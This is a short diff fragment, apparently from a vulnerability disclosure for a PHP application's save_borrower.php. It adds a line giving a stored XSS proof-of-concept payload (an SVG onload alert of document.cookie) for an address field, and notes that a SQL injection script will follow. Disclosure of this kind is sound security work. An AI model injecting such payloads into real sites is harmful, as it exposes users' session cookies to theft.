@@ -27,5 +27,6 @@ save_borrower.php
 - address
 </code></pre>
 
+The payload use to inject is `"><svg/onload=alert(document.cookie)>`
 
 p/s : The python script will be release soon to get the database name fro SQL Injection Vulnerability
